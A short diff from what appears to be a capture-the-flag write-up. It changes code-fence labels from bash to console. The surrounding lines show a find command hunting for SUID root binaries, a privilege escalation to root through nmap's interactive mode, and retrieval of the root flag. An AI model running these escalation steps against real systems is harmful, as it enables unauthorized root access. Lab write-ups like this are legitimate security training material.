@@ -572,7 +572,7 @@ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
 
 > The SUID-enabled `nmap` binary was leveraged to achieve privilege escalation and obtain `root-level access`:
 
-```bash
+```console
 
 robot@ip-10-80-150-182:~$ nmap --interactive
 Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
@@ -586,7 +586,7 @@ uid=0(root) gid=0(root) groups=0(root),1002(robot)
 
 > We get the root flag from the `/root` directory:
 
-```bash
+```console
 
 # cd /root
 # ls
